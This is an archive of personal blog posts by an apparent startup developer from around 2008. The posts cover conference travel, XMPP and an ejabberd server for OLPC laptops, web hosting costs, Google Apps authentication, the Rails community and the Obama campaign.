<p>Immediately after landing in chicago from the bay, we flew to NYC for a R&#38;D conference with Insight Venture Partners (investors in skinnyCorp/Threadless). The conference was interesting. A lot of the companies that attended with us were experiencing very different growth that we are - so a lot of the sessions were not targeted towards small development teams. It seemed that they were attempted to work how we work, but through philosophies like scrumm and agile methodologies. Interesting to talk about, but it doesn&#8217;t really fit us. We were, however, able to go to some excellent places to eat. On Monday, we went to <a href='http://www.employeesonlynyc.com/'>Employees Only</a>. And then we went to the pretentious <a href='http://www.sohohouseny.com/launch.html#9***1***1'>SoHo house.</a> I found Employees Only to be awesome. It had excellent food and quite a drink menu. We also were able to have a really great time there. It wasn&#8217;t too pretentious and the people around us didn&#8217;t mind us having fun. The SoHo House had mediocre food and a weird vibe. My NY friends mentioned something about it being frequented by <a href='http://gawker.com/news/hit-piece/principal-hells-the-rough-guide-to-soho-house-203290.php'>bankers</a> - but it seemed more hip than that, but that may have contributed to the weird atmosphere. Regardless of the food and atmosphere, the view was great. After dinner, we ended up at <a href='http://newyork.citysearch.com/profile/44527657/new_york_ny/205_bar.html'>205</a> for a LOT of drinks and entertaining shit talking. Great times.</p>

<p>That brings us to the present.</p>

<p>Next I am going to be going to San Antonio again to finalize some of our discussions with our team. Then Colorado for <a href='http://atkinx.com'>Atkins</a> wedding, and finally to <a href='http://en.wikipedia.org/wiki/Yamanashi_Prefecture'>Yamanashi</a> for Hiromi&#8217;s grandfathers final funeral (and to hang out in Japan). A lot of traveling.</p>

<p>With this flux of traveling, I have become a bit obsessed with tracking it in interesting ways. For instance, i have been using <a href='http://Tripit.com'>Tripit.com</a> and <a href='http://www.dopplr.com/traveller/natatwo'>dopplr.com</a> to track various aspects of my trips. I have tripit.com hooked into dopplr.com so that I don&#8217;t actually have to do any work. Just email my plans to tripit and BAM - dopplr is updated. pretty cool.</p>

<p>The trip was hilarious from the get go. On a Thursday, we flew into Phoenix via SouthWest. That airline is a <a href='http://www.google.com/search?q=southwest+sucks'>clusterfuck</a>. I am not a fan. However, it is much better when we have &#8220;Business Class&#8221; tickets - which apparently means we get a drink ticket to dull the pain, and get to board a bit earlier than the others. It was a mess of annoying drunk middle aged women on a group trip, children and indignant and entitled business men who thought they were all that. We owned them all. Once we landed, we rented a <a href='http://flickr.com/photos/natatwo/2372164187/'>very stupid car</a>, and then drove the neat/boring drive to Tucson. Once we got to Tucson, we wrote our presentation (luckily <a href='http://callmejeffrey.com'>Jeffrey</a> has spent countless hours creating legitimate slides for us slackers to pilfer) and got on our way.</p>

<p>We had some awesome Mexican Food. Went to a couple hilarious bars, met some cool people, and ended up at a lesbian bar. It was pretty different than our times in chicago. ;) The night life in Tucson, near the college, is full of college kids. Weird. Being around so many young people was invigorating. And annoying. haha. GOD I am so old. OMG.</p>

<p>The next day we went to the event and spoke. It went over well. We got some good feedback. Like: don&#8217;t swear as much, don&#8217;t put up Obama 2008 slides and practice before we actually do it. I thought that was decent feedback. I think if we did it again the only thing I wouldn&#8217;t change is the Obama slide, and it seem that was the most offensive. Apparently, you are not supposed to be political at all on a college campus. I wonder when this happened? It certainly wasn&#8217;t like this when I was in college. Maybe at a &#8220;conservative&#8221; business school, things are different. Regardless, if I were to speak there again - and the political climate is the same as it is now, I would put the same slide up.</p>

<p>The other people we spoke with were amazing. Particularly Robert V. Kozinets. This dude is awesome. He has written extensively about <a href='http://kozinets.net/archives/97'>tribes on the internets</a> and <a href='http://www.burningman.com/whatisburningman/2003/03_news_sum4.html'>burning man</a>. I imagine that you have read about him before (even if you didn&#8217;t notice). We ended up hanging out with him quite a bit. Another person who uses words I have never heard to describe things that we do everyday. I am particularly interested in his work on Burning Man. I guess I will have to read it.</p>

<p>After all the festivities of the event were over, we chilled on the streets of Tucson, and eventually met up some of the staff of the Eller College of Management for dinner. The dinner was great, but even more great was meeting <a href='http://www.drsidneyjlevy.com/'>Sidney Levy</a>. Sidney is apparently one of the people who <a href='http://books.google.com/books?hl=en&amp;id=IB95hkJczk4C&amp;dq=sidney+levy&amp;printsec=frontcover&amp;source=web&amp;ots=fRR2Nkl7id&amp;sig=7XQtrnSG0b-MaKDq1g4xXxbBDsQ#PPP1,M1'>developed the world of brand marketing</a>. He was billed as the father of symbolic marketing. This is serious business. However, he was very much not serious business. He was awesome. Charlie and I hung out with him for about an hour, just talking about life, love and all things that occur between. Sidney was quite funny and had a lot to tell us. I am going to attempt to help him get his gullibility project going. Excitement.</p>

<p>Speaking is pretty awesome. I learned a lot from talking to the people around us. It was awesome to hang out with young people who are excited about something that I am not excited about. Inspiring and hope giving. I hope that Charlie and I get to do it again. Hopefully in Hawaii, or maybe Guam, or possibly some other paradisiacal place.</p>

                <p>Last week my friend <a href='http://mark.atwood.name'>Mark</a> pinged me and mentioned that I should get together with a friend of his who was in town for PYCON. I am always into meeting new people so I had dinner with <a href='http://dorseys.org/'>Brian Dorsey</a>. It was awesome. I was able to rant and rave about all my ideas, interests and whatnot with new and possibly interested. Brian immediately suggested that he introduce me to a friend of his who he thought I would enjoy talking to. So I was introduced to <a href='http://anders.conbere.org/journal/'>Anders Conbere</a>. The reason Brian thought we should meet was that we both incessantly talk about XMPP.</p>

<p>Anders and I talked for a couple hours Friday, and found that we had a lot of similar ideas and thoughts about XMPP and its place in the world of social software, communities and data. Anders explained that we weren&#8217;t the only crazies who thought that XMPP should be used for more than instant messaging. He mentioned that <a href='http://stpeter.im/'>some</a> <a href='http://romeda.org/'>cool</a> <a href='http://www.hackdiary.com/'>kids</a> were also looking into the relationship of XMPP and social software. As Anders was dashing out the door to his flight, we decided that we needed to create or at least foster the growth of a mailing list to collect people.</p>

<p>Earlier today, Anders introduced me to <a href='http://stpeter.im/'>Peter Saint-Andre</a> who is the Executive Director of the XMPP Standards Foundation. We chatted a bit and then came to the conclusion that there needed to be a place for people to talk about their ideas, uses, experiences and what not. And thus <a href='mailto:social@xmpp.org'>social@xmpp.org</a> was <a href='https://stpeter.im/?p=2177'>born as the go to mailing list to discuss these topics</a>.</p>

<p>I have a lot of ideas and hopefully with the help of this group, I can flush them out and really tackle them. I am pretty excited about it.</p>

                <p>I am finally recovered from my flash travel/party tour. Being shuttled around the country going to parties is a rough life - let me tell you. It was awesome. I met some great people and saw some really cool stuff. It was really cool how much overlap occurred between the boulder crowd and SXSW.</p>

<p>Startup people are fun.</p>

<p>I want to run down the events and how they turned out. The first was boulder. <a href='http://www.keepboulderweird.org/'>Boulder is a weird place</a>. Seriously. It is strange. The boulder event was at this bar called the Foundry. I am guessing that if it wasn&#8217;t packed to the gills with tech people from the front range, I would never go there. It was a pretty hilarious venue, however the tech people really filled it out. So it turned out to be a great choice.</p>

<p>In boulder there were a lot of cool startups presenting. The one that really caught my eye was <a href='http://socialthing.com'>Socialthing</a>. These guys are sweet. They are doing a very simple and elegant solution for the crowded social aggregation space. Although I really like the community features of their direct competitor <a href='http://friendfeed.com'>FriendFeed</a>, I like the design and interface of socialthing alot. It is great - and they are sweet guys.</p>

<p>There were a fair number of other startups, but unless they have real words in their names - i won&#8217;t link them. Just kidding, but seriously - there were a fair number of people with startups that plain didn&#8217;t have the best names. It is a bummer. Especially because the people were so nice and their ideas/technology seemed solid. It is <a href='http://deliberately-different.blogspot.com/2006/02/how-they-named-companies.html'>hard to</a> <a href='http://www.salon.com/media/col/shal/1999/11/30/naming/print.html'>name a</a> <a href='http://blog.guykawasaki.com/2006/02/the_name_game.html'>company</a>. Anyway - some of the not so awesomely named but awesome technology and problem solution startups in boulder are: <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;blockquote&gt;&lt;a href=&quot;http://Lijit.com&quot;&gt;Lijit.com&lt;/a&gt; - doing search for your blog. kinda like google site search, but with your social graph built in. Really cool stuff.</pre></p>
<a href='http://Villij.com'>Villij.com</a>
<p>I also met a really awesome &#8220;startup enabler&#8221; named <a href='http://jeremytanner.com/'>Jeremy Tanner</a>. He seems to do what I do at Threadless for various startups in the Colorado scene. Jeremy moved from Detroit to Colorado - so he had a lot of input on how it was going from city to smaller city. He had great things to say about being able to jump on his motorcycle and head to the canyons for an awesome lunch time experience.</p>

<p>After this event, I crashed at my hotel. Spent some time with my parents and was off to SXSW for ONE day!</p>

<p>With much insanity, I finally made it to Austin and barely made it to the People Powered Powwow. It was awesome. Hearing the experiences of <a href='http://etsy.com'>Etsy</a>, <a href='http://www.timbuk2.com/tb2/products/bagbuilder'>Timbuk2</a>, <a href='http://moo.com/'>Moo</a>, <a href='http://www.jpgmag.com/'>JPG</a> and all the other awesome companies was quite inspiring. It was also awesome to meet the people who are behind all these awesome brands. It was like a secret people powered club where we all tell our people powering secrets. A really powerful meetup. I am glad that <a href='http://richardmoross.com/'>Richard</a> (from moo) set it up. it alone was worth the trip.</p>

<p>Some of the companies that were there that I really liked: <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;blockquote&gt;&lt;a href=&quot;http://styleshake.com/user/&quot;&gt;Styleshake&lt;/a&gt; - I was surprised by this one. Styleshake is a neat community that helps facilitate custom dresses. Another thing I would have never guessed would be made into a crowd sourcing enterprise - but it works. And it seems to work well. The dresses are cool and the variations are impressive. If I was a svelte young woman I would certainly check this out.</pre></p>

<p>After the mini conference, I was fortunate enough to have dinner with the JPG people and Wilson Minor (<a href='http://everyblock.com'>EveryBlock</a>). We ate at some nice Mexican food place. It was good, better than Chicago Mexican food. Then I made my way to the soon to be <a href='http://upcoming.yahoo.com/event/430139/'>bumping party</a>.</p>

<p>The party was fun. There were a lot of people. Floss seemed to be well accepted and it was awesome to meet <a href='http://www.kidkameleon.com/'>kid kameleon</a>. Around this time I had the awesomeness to bump into a dude from <a href='http://www.threadbanger.com/'>Threadbangers</a>. he was able to capture my <a href='http://www.threadbanger.com/episode/SXSW_20080310'>natural retardedness for an episode of threadbangers</a>. haha. Whew.</p>

<p>After my debut in amazing, I was able to take a minute and meet up with some friends. It is fun to hang out with Chicago friends when not in Chicago. I met up with <a href='http://jacobdehart.com'>Jacob DeHart</a>, <a href='http://bloxes.com/'>Aza Raskin</a>, <a href='http://www.srobbin.com/'>Scott Robbin</a>, <a href='http://www.humanized.com/about/'>Andrew Wilson</a>. Another person I was thrilled to meet up with is <a href='http://mediadiet.net/'>Heath Row</a>. Heath has always been a favorite person of mine and it is great (and rare) to hang out in person.</p>

<p>After the party died down - we all went to the <a href='http://PureVolume.com'>Pure Volume</a> ranch for the Social Thing party and my trip came full circle. I was able to meet up with the Lijit, Villij and Socialthing guys. After rocking out there for a couple hours i decided to head home, sleep and finally attempt to make my way back to Chicago.</p>

<p>I barely made it. ;)</p>

                <p>Today I spent a minute setting up a <a href='http://lists.laptop.org/pipermail/olpc-chicago/2008-March/000136.html'>Ejabberd Server</a> for the OLPC Chicago group. This will allow all of us OLPC XO hackers to be on the same &#8220;mesh.&#8221; To get started using the jabber server with your XO follow these simple steps: <blockquote>
<ol>
	<li>Boot the XO</li>
	<li>Get connected to the internet</li>
	<li>Open a terminal (activity or ctrl-alt-f1)</li>
	<li>in the shell, type: su -</li>
	<li>then type: <i>sugar-control-panel -s jabber jabber.olpchacks.org</i></li>
	<li>then press ctrl-alt-erase to restart sugar/X</li>
</ol>
</blockquote> Once this is done, you should start to see other Chicago XOs. You will know you are successful if you see me (Harper) in the community view. Please <a href='http://harperreed.org/contact'>let me know</a> if you are able to get on, or if you are having trouble.</p>

<p>Getting the server going was pretty simple. I was able to jump right in thanks to this <a href='http://morgancollett.wordpress.com/2008/02/27/olpc-community-jabber-servers-ejabberd-200-from-source/'>awesome write up</a> by <a href='http://morgancollett.wordpress.com/about/'>Morgan Collett</a> of <a href='http://www.collabora.co.uk/'>Collabora</a>. The install goes like this: you get your debian install primed, download the source, patch the source, compile the source, install the compiled binaries, edit the config, start the server and edit the server roster config. Then BAM you have a <a href='http://www.ejabberd.im/'>ejabberd server</a> rocking and ready to go with your XO. The only caveat i ran into was that the config file from the <a href='http://wiki.laptop.org/go/Ejabberd_Configuration'>ejabberd wiki page</a> details using IPV6 because eventually all the laptops will be using IPV6 to get around. However, the server i used was balking at this - and kept crashing ejabberd with the MOST verbose errors ever (I.E. no error). When i finally figured out what the problem was, it was smooth sailing.</p>

<p>One thing to note - ejabberd is seriously business. <a href='http://erlang.org/'>Erlang</a> is interesting to work with. I was lost for about 2 hours before I gave up trying to understand what was going on and just dived in. Then it didn&#8217;t make sense, but was working and I was happy.</p>

<p>It is really neat how the XO uses jabber to group people together. I really think that jabber is the future and seeing something use XMPP so elegantly is quite inspiring. I found one of the coolest parts of the implementation is how the rosters are forced to see everyone online - which i imagine is what powers the neighborhood view on the XO. This makes me wonder if this could be tweaked to create a more interactive or social networking aspect to the XO neighborhood.</p>

<p>One thing I would like to know about is how the XO uses the Multi User Chat features of the jabber server. I am not sure if the <a href='http://wiki.laptop.org/go/Chat'>Chat Activity</a> uses MUC to work, but it would be cool if you could chat with XO users with a regular user account on the jabber server by joining a specific room. I will have to research that.</p>

                <p>I spend WAY WAY too much time trying to figure out where and how to host my websites. I guess you could it a hobby. A really horrible and expensive hobby. It isn&#8217;t a great way to meet friends, enjoy life or honestly save money. However - it prepares me for the awesome ability to bitch about hosting and to write this blog entry.</p>

<p>A couple weeks ago, Mosso changed some stuff and got my buddy <a href='http://broox.com'>Derek</a> and I got to talking about hosting options if Mosso doesn&#8217;t pan out. I decided that since I have this perverse hobby, I should document my journey.</p>

<p>So here is my list of hosting providers I recommend and enjoy!</p>
<b><a href='http://mosso.com'>Mosso</a></b><b><a href='http://www.mediatemple.net/'>MediaTemple</a></b><b><a href='http://www.fdcservers.net/'>FDCservers</a></b><b><a href='http://www.webfaction.com?affiliate=harper'>Webfaction</a></b><b><a href='http://www.rackspace.com'>Rackspace</a></b>
<p>These are the hosts I use on a daily basis. All of them i recommend. Obviously you wouldn&#8217;t use Rackspace to host your not often read blog, and you wouldn&#8217;t use webfaction to host your $100MM social network. However, all of these options have one thing in common. They all have decent support and they all seem to LOVE what they are doing. I can&#8217;t deal with vendors who offer products that they themselves wouldn&#8217;t use. You can&#8217;t trust those guys. You can trust all these guys (except FDC - with their prices, they have to be doing something tricky. heh. ).</p>

                <i><b>UPDATE: </b>Not a moment after i posted this - i got a mosso mailing that explained an upgrade in the plan. I will leave the original number in because i still think my point is valid and because that is what new Mosso customers will be getting. Their update is just a quick fix to stop us from bitching. It isn't solving the problem.</i>
<p>I have <a href='http://www.nata2.org/2007/06/05/hosting-woes-collocation-and-how-mosso-sucks'>blogged about Mosso before</a>. I have used them practically from their inception (well before they were cool. hah). I have been happy and I have been totally pissed. but for the most part they have done an amazing job of doing shared hosting in the most unsucky way possible. The features and capabilities they offer are hard to beat. They have some quirks and growing pains - but what shared host doesn&#8217;t. But Mosso is quite different than most shared hosts.</p>

<p>What is really neat about Mosso is that Mosso is just a giant cluster. So your sites are load balanced across many many servers. Its how I imagined cloud or &#8220;grid&#8221; hosting should be. And it works. and it works well. You don&#8217;t have to worry about your small site being sucked of its life by a larger site that sits on the same server. every site is spread over multiple servers - so your site gets the same priority as a HUGE site.</p>

<p>Its awesome. and super cheap.</p>

<p>I am hosting around 150 sites for 100 bucks a month. With crazy white label options and more features than almost any host. I use it primarily for hosting all my shitty domains and for hosting my friends blogs and sites. I don&#8217;t host large sites on there, but I do have probably more on Mosso than I should in one account. I never hit any of the resource limits and I was never told to host less. In fact - there are no limits to what you can host as long as you stay within the resource limits.</p>

<p>Obviously, I am not alone in this use case. I imagine that many clients are abusing their cluster the same way I am, with no practical repercussion and no way to limit them without drastically changing their plan.</p>

<p>I am guessing Mosso was looking at their usage and looking at us horrible clients - and figured that they were getting owned. So they decided to set up a new resource metric.</p>

<p>How they picked requests, I will never know. But they decided to bill based on requests. So each person gets 3MM requests a month. This is some 1995 shit. I mean - requests is just an annoying &#8220;web 2.0 cloud computing market speak&#8221; for hits. Everyone knows what a hit is. everyone knows that you can have a shitty site and have a lot of hits. Nobody uses hits as a metric. Except Mosso ;)</p>

<p>With Mosso&#8217;s new pricing, you get charged for each &#8220;hit&#8221; to a site that is hosted at Mosso. If you go over your 3MM allotment, you get charged at $0.03 for each 1000 &#8220;hits&#8221; to your site. seriously. three cents for every 1000 hits.</p>

<p>That means - if you have a horrible blog that has 50 images on every page load. And you get around 2500 views a day (which is a lot - but not unrealistic). You will use up all your &#8220;hits&#8221; for that month. But if I don&#8217;t have all those images, my 2500 view a day blog will not use all the &#8220;hits&#8221; up. Keep in mind as well that Mosso is a place where you are able to host an unlimited number of sites. So what happens if you have 50 clients, and each client is using around .5MM &#8220;hits&#8221; a month. You end up paying about ~$750 in overage for your cheap shared hosting. per month. Suddenly Mosso is more expensive than a NICE dedicated box from Server Beach.</p>

<p>I imagine that the 5MM &#8220;hits&#8221; is just a rough number they thought up. I am guessing they are going to change that number. Offer a couple price plans and generally try and make things better.</p>

<p>My concern is not in them attempting to make things better, more equal or for them to change the pricing into a more ala cart type of offering. My concern is in the requests metric. It doesn&#8217;t make sense. There are lot better ways to measure server usage than something that is arbitrary and negatively impacts the people who are building these sites. People who use a premade CMS like drupal or wordpress may incur more charges than people who are using simpler, css based custom sites. People who have sites that are heavy in graphics (graphic designers, ad people, agency people) will all be effected - because they are more worried about how the site looks and how it is presented - not how many &#8220;hits&#8221; each page view will take.</p>

<p>The whole philosophy of Mosso seems to be for them to take the much needed place of being a simple shared host targeting designers and other internet people who dont want to worry about their hosting and don&#8217;t want to pay for a dedicated box. Someone who wants to give their client SOLID hosting, but doesn&#8217;t want to hire a sysadmin. It seems to me that those people are not going to want to start worrying about how many &#8220;hits&#8221; each page view gets, nor are they going to want educate their clients that the more successful their site gets - the more they have to pay.</p>

<p>I think that the &#8220;pay for what you use&#8221; model is the future. It doesn&#8217;t make sense for me, with sites that are using 90% of a servers resources to pay the same as someone who is using 10% of a servers resources. However, it should be something that is quantifiable and based on actual server usage. Not something that is relative to how your site is laid out and created.</p>

                <p>At work we use <a href='http://google.com/a'>Google Apps</a> for our enterprise email and calendaring. We use pretty much the entire gamut of tools Google provides us. And for the most part, we love it. It is great to have an easy to use, inexpensive suite of hosted tools that you can use from anywhere.</p>

<p>Gmail is far better than outlook for our organization and the other tools just help make things go smoothly. We use docs quite a bit for knowledge share and even use it some in the warehouse for quality control and what not. its neat stuff.</p>

<p>Recently, we have been adding various appliances to our organization that can authenticate users based on an <a href='http://en.wikipedia.org/wiki/Ldap'>LDAP data store</a> or a <a href='http://en.wikipedia.org/wiki/RADIUS'>Radius server</a>.</p>

<p>It started with one of out <a href='http://en.wikipedia.org/wiki/Samba_%28software%29'>file servers</a>. I wanted to make it so people have their own share for archiving and backing up personal documents. A place that is &#8220;protected&#8221; by their password. But with 35 employees possibly accessing the file server, it is not efficient to have another ACL system. So ultimately it would be nice to have it use Google Apps as authentication portion.</p>

<p>I googled a bunch and forgot that this was a goal. Until this last month when we added an awesome wifi mesh system (<a href='http://www.aerohive.com/'>Aerohive</a> - hit me up if you want hooked up with them, awesome stuff) and we grabbed a MUCH better VPN subsystem (<a href='http://www.juniper.net/products_and_services/ssl_vpn_secure_access/'>Juniper SSLVPN</a>). Both require user auth to work most securely. Which means that in the best case, both would authenticate to the same ACL system that the file server is authenticating against.</p>

<p>Once again, the problem of integrating Google Apps accounts into an LDAP/Radius service was brought to my attention. It seems like it should be something that is relatively easy to integrate. However, I can&#8217;t quite grasp the <a href='http://code.google.com/apis/apps/sso/saml_reference_implementation.html'>SAML offering that the Google Apps API suggests using</a> for SSO. I couldn&#8217;t easily figure out if this would be an option for web only authentication, or I could drop it into a <a href='http://wiki.freeradius.org/Base_Modules'>freeradius module</a> (using <a href='http://wiki.freeradius.org/Rlm_python'>rlm_python</a>). It also seems that it is a way to use a radius server to authenticate a local user into their Google Apps account. Not the direction that I want. It seems like this should be possible, but i wasn&#8217;t able to find any help on the various Google Groups that suggested that it possible.</p>

<p>I got to thinking. If I am going to be hacking away at a python module for freeradius or using <a href='http://www.wiggy.net/code/pyrad/'>pyrad</a> to create a radius server - why couldn&#8217;t I just have it authenticate against Google Apps jabber server. Basically using <a href='http://xmpppy.sourceforge.net/'>XMPPPY</a> or whatever to hit talk.google.com and check if a user is authenticating correctly, and if so let them in.</p>

<p>The immediate benefit of piggy backing on Google&#8217;s jabber server is that I would be able to bypass managing user accounts or passwords. They would be managed by the users themselves or by whoever is managing the user accounts. It would be independent of the Radius server.</p>

<p>Some immediate problems are that all the users would immediately have the same access. If I wanted more granularity of access, I would obviously have to create some ACL system that sat between the XMPP auth and the response to the radius request.</p>

<p>I am guessing that figuring out if SAML would work would be easiest. I can already tell this is possibly a backwards way of doing it. I just want everything to work well together. And I want to haxor up some python.</p>

                <p>Apparently I am in the March Wired magazine. I am not sure exactly what the title of the article or the exact content - but I was interview about my views on the rails community as someone who left the community and moved on to other things. (I think - I haven&#8217;t seen it - just heard that i was in it.)</p>

<p>My history with rails is a tumultuous one. I first played with rails pre 1.0 while working with my buddy <a href='http://www.cs.cmu.edu/~acarlson/'>Andy Carlson</a>. In a flurry of excited and hilarious programming, I learned ruby and started building web applications in rails. It was a brilliant time. I enjoyed the layout and structure of the applications. I enjoyed the beauty of the Ruby language. Probably most of all, I enjoyed the excitement of learning a new framework and language. One of the things I did - was recreate a couple apps I had written in php. The development time was LOADs faster than the time the same app took to write in PHP. Blew my mind.</p>

<p>Suddenly I was a rails advocate. I advocated <a href='http://sethgodin.typepad.com/'>Seth Godin</a> use rails for his <a href='http://www.squidoo.com/'>Squidoo</a> project (he used PHP - I guess I wasn&#8217;t convincing enough, but he employs a <a href='http://blogs.squidoo.com/squidblog/?author=2'>great PHP guy</a>, so no worries). I ended up teaching Rails to <a href='http://www.socialtwister.com/'>Greg Narain</a> (who now has a <a href='http://www.bluewhalelabs.com/'>rails consultant firm</a>) and I eventually even brought up using rails at <a href='http://skinnycorp.com'>skinnyCorp</a>. Right about the time I got turned down to use rails at skinnyCorp (right when I started. hah), I started to notice that any time my rails sites got traffic, they would crash. Then, the upgrade to post 1.0 rails code killed all my rails apps. So I made the sad decision to move a lot of them back to PHP. My servers stopped groaning, I didn&#8217;t have problems with an upgrade path - but I was bummed because I didn&#8217;t have a good rake.</p>

<p>Since I was doing PHP full time around this time period, I started trying to move what I learned from rails into our PHP work. I was probably 100% a better coder because of ruby and rails. I was a staunch MVC layout supporter. I was very against procedural PHP in our apps and I fought to the death to try and get all my apps (including skinnyCorps) to have a layout and framework that created a rapid development environment and made sense. (luckily I had the help of <a href='http://localkinegrinds.com/'>Kanno</a> to work this out. He totally helped). For inspiration and education I continued to read various rails blogs and started paying attention to other framework projects - <a href='http://www.djangoproject.com/'>django</a>, <a href='http://www.cakephp.org/'>cakephp</a> to name my favorites. While dabbling in these other communities i started to notice how negative the rails community was.</p>

<p>This is what I talked to the wired writer about.</p>

<p>I hate how hard it is to get around in the rails community. From sitting on IRC and mentioning that I use php and then having a flame war erupt, to having to defend various non rails design patterns to every n00b out there who doesn&#8217;t know who <a href='http://www.martinfowler.com/'>Martin Fowler</a> is. It was draining. And to tell you the truth, that is the primary reason that when I left rails - I never came back. In my experience learning other languages, and other frameworks - I never once heard &#8220;omg. you are totally doing it WRONG.&#8221; Only while working with the rails community did I ever hear that. and I heard it often. and from the rails leaders.</p>
<a href='http://www.nata2.org/2007/04/15/rails-woes-the-slow-that-is-keeping-twitter-down/'>I have blogged about this before</a>
<p>I think that the rails leaders are killing the rails community. I don&#8217;t think zed was entirely correct - but I do think he had some great points. But I have been out of it for a minute, so I can&#8217;t really speak for recent events. But I see what the intraweb sees. And I see a community who is lead by people who are negative, rather mean and not willing to accept criticism at all. But then again, who is able to easily accept criticism and when they are criticized, how should they respond?</p>

<p>I have no idea. But for me, I would have liked any reaction that wasn&#8217;t snarky, soapboxy and that solved the problem - because there are problems and telling people they are wrong is not going to solve them. I think the rails community should probably watch <a href='http://video.google.com/videoplay?docid=-4216011961522818645'>this video</a>. They should think before they post. They should abandon their emotions when talking about programming and technology. They should get girlfriends. Just kidding - all the rails coders I know have hot girlsfriends/wives (which probably exacerbates the annoyance when they are dicks online).</p>

<p>Anyway. Since I live in a glass house and all, I am going to go outside and see if I can&#8217;t find the new wired. Hopefully I don&#8217;t look like a dick in it.</p>

                <p>This weekend I went and volunteered for the Obama Campaign. It was a great experience. I showed up at 12pm and stayed until around 5. I was surrounded by great people who all believed in Obama and his movement. Quite inspiring. I worked on validating submitted volunteer information. it was tedious work. I went through about 4500 records, sorting and updating. My eyes were done with computers by the time I left. In the middle of all the data entry and validation, one of the campaign people came into our workroom and showed us the <a href='http://www.yeswecansong.com'>will.i.am video "yes we can."</a> Amazing. (<a href='http://youtube.com/watch?v=jjXyqcx-mYY'>youtube link</a>). <div src='http://www.youtube.com/v/2fZHou18Cdk&amp;rel=1' type='application/x-shockwave-flash' wmode='transparent' height='355' width='425'>Watching that with a group of people who are incredibly dedicated to a movement which they believe in is an inspiring event. It made me want to take the week off work and go door to door in some under represented state. The video/song is made by Will.I.Am from black eyed peas and has a cast of quite a few artists who are singing the speech <span><a href='http://youtube.com/watch?v=Fe751kMBwms'>Obama gave in Nashua, New Hampshire on the night of the New Hampshire primary</a>. Pretty intense. There is a great <a href='http://www.huffingtonpost.com/garrett-graff/why-yes-we-can-inspires_b_84838.html'>break down of the video by Garrett Graff over at Huffington Post</a>. Interesting to read about the history of the "Yes We Can" phrase. </span>
<span>The whole experience of seeing the campaign inner-workings, working with people who believe in this movement, and just feeling a small amount of membership to this amazing movement was very moving. It was like a spark inside of me. So much hope and excitement. </span>
<span>So go and vote. Let's make our voice heard. </span></div></p>

            <div class="PostContent">
                <p>In the past week there were a couple of companies(<a href='http://tumblr.com'>tumblr</a> and <a href='http://37signals.com'>37signals</a>) who publically blamed Rackspace for the downtime of their sites (tumblr <a href='http://blog.davidville.com/2008/01/21/downtime-today/'>here</a> and 37signals <a href='http://www.37signals.com/svn/posts/800-what-happened-this-morning'>here</a>, <a href='http://www.techcrunch.com/2008/01/18/37signals-down-looks-like-rackspace-is-to-blame-again/'>here</a>) . In both cases the downtime wasn&#8217;t widespread and was limited to the individual sites. In both cases someone from the respective site blogged about how it was rackspaces fault they were down. It got me thinking&#8230;</p>

<p>I don&#8217;t like how these companies are blaming their vendors when their sites are down. I understand how frustrating it is. I totally realize how you want a scape goat. And i have personally had experiences where Rackspace has screwed up and i have said to Jake: &#8221;<i>WTF. Rackspace broke all of our shit</i>&#8221; (which was quickly followed up with &#8221;<i>Yeah! Rackspace fixed all of our shit</i>!&#8221; - seriously, i love those guys). But what gets me is when that scapegoating and blaming bleeds into the conversation a company has with its clients/consumers. The customers don&#8217;t need to hear which vendor broke everything, they just want to hear about solutions and uptime.</p>

<p>It seems to me that these companies are basically saying &#8221;<i>this is the entity who is at fault. It isn't us. In fact - we are so smart that we don't need them. we are changing hosting.</i>&#8221; But they should be saying “<i>We were down. bummer. we are up now.</i>” The snideness is quite annoying to me.</p>

<p>What do yall think - should companies be blaming their vendors - or just take the blame on themselves? I think its hard. I know i have blamed people for faults that really lie with myself. It is certainly easier to write off a simple failure that happens to occur on the vendors property as not my fault. But in the end, didn&#8217;t i pick the vendor? Didn&#8217;t i make the decisions that put my company in a place where the vendor could fail?</p>

<p>What i would like to see, is companies taking the blame and just rocking through the casual failures. Making sure their clients know that even though there was a failure, that they are on it. That they have their hands in every single part of their infrastructure. One side effect of this blaming is that you ruin the black box effect your customers have with your software. You suddenly have many more complicated pieces of the puzzle and your customers may be leery to trust their data in such a hodgepodge of systems/vendors/etc. Of course i am hypothesizing here, but i do know that the first time i thought about how tumblr did their infrastructure was not when it went down, but when they blamed rackspace. Before they mentioned that, i just wanted them to be back up.</p>

<p>I am interested to hear what others think of this trend. I am guessing that people will learn that blaming is annoying. I hope that i don&#8217;t ever do it. I will surely think about this next time i am faced with downtime and have a choice in what to tell my customers.</p>

                <p>This is exciting. Obama is the first candidate I have ever donated money too. Hopefully this will enable his campaign to get enough traction to win on a national level. Hopefully it is Obama and Huckabee against each other. Because then we either get Obama - who is pretty awesome, or Huckabee who is an insane person. INSANE. So either the U.S. will be in a place to repair, or a place to engage in a Holy war with the world.</p>

<p>Anyway. We just got back from japan. It was amazing. Everyone had a great time. Pictures are up on <a href='http://www.flickr.com/photos/natatwo/sets/72157603616549745/'>flickr</a>. I will blog about it later.</p>

                <p>Awhile ago i decided to switch to Linux on my laptop. It was awesome. I didn&#8217;t last however - a work emergency occurred and I spent more time getting the openvpn to work up and then getting the Cisco vpn to our servers going than solving the emergency problem. It was indicative that i should have eased into desktop Linux a bit more.</p>

<p>So I have with much sadness reinstalled windows on my primary laptop. Since i do so much of my work in Linux still - I just moved my Linux desktop home dir into vmware and rock it there.</p>

<p>Having to switch back made me really bummed. I wanted to use Linux full time. I use it constantly on servers and for coding, but I wanted to engage in it for everything. It is obviously very usable and compelling - but it just didn&#8217;t solve the problem I needed solved at that one very important point.</p>

<p>The good news is that I have another laptop that I use casually. It is a lot smaller and much more portable. And it is now my desktop Linux machine - so I haven&#8217;t given up totally. And it is a much more interesting test of the usability of desktop Linux - because Hiromi will also be using it while we travel.</p>

<p>So far - so good.</p>

<p>I will hopefully be able to figure out my VPN issues and move back to linux.</p>

<p>I like not having to deal with Jesus during the holidays. Its nice to be able to supplant tradition with something new and totally different. Like going to Japan.</p>

<p>The plan thus far is to hang out in Tokyo for a couple days and then make our way to Yamanashi for a party on the 28th. Then we will have New Years with Hiromi&#8217;s family and then head home.</p>

<p>It is going to be quite something I think. Look for pictures!</p>

I was able to meet up with trow and the hosted labs guys - so that was good. It is always fun to involve ourselves in these affinity events. This one was especially funny because it was at a good friends bar. So when we showed up - it was quite hilarious.</p>

